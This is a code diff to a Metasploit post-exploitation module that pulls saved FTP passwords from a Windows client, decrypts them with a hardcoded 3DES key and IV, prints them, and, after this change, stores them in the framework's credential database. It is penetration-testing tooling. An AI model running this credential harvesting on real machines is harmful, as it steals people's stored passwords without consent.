@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -9,7 +9,7 @@ require 'rex/parser/ini'
 require 'msf/core/auxiliary/report'
 
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -66,19 +66,32 @@ class Metasploit3 < Msf::Post
       next if passwd == nil or passwd == ""
       port = 21 if port == nil
       print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
-      if session.db_record
-        source_id = session.db_record.id
-      else
-        source_id = nil
-      end
-      report_auth_info(
-        :host  => host,
-        :port => port,
-        :sname => 'ftp',
-        :source_id => source_id,
-        :source_type => "exploit",
-        :user => username,
-        :pass => passwd)
+      service_data = {
+        address: Rex::Socket.getaddress(host),
+        port: port,
+        protocol: "tcp",
+        service_name: "ftp",
+        workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.refname,
+        username: username,
+        private_data: passwd,
+        private_type: :password
+      }
+
+      credential_core = create_credential(credential_data.merge(service_data))
+
+      login_data = {
+        core: credential_core,
+        access_level: "User",
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
+
+      create_credential_login(login_data.merge(service_data))
     end
   end
 
@@ -86,7 +99,7 @@ class Metasploit3 < Msf::Post
     decoded = pwd.unpack("m*")[0]
     key = "\xE1\xF0\xC3\xD2\xA5\xB4\x87\x96\x69\x78\x4B\x5A\x2D\x3C\x0F\x1E\x34\x12\x78\x56\xab\x90\xef\xcd"
     iv = "\x34\x12\x78\x56\xab\x90\xef\xcd"
-    des = OpenSSL::Cipher::Cipher.new("des-ede3-cbc")
+    des = OpenSSL::Cipher.new("des-ede3-cbc")
 
     des.decrypt
     des.key = key
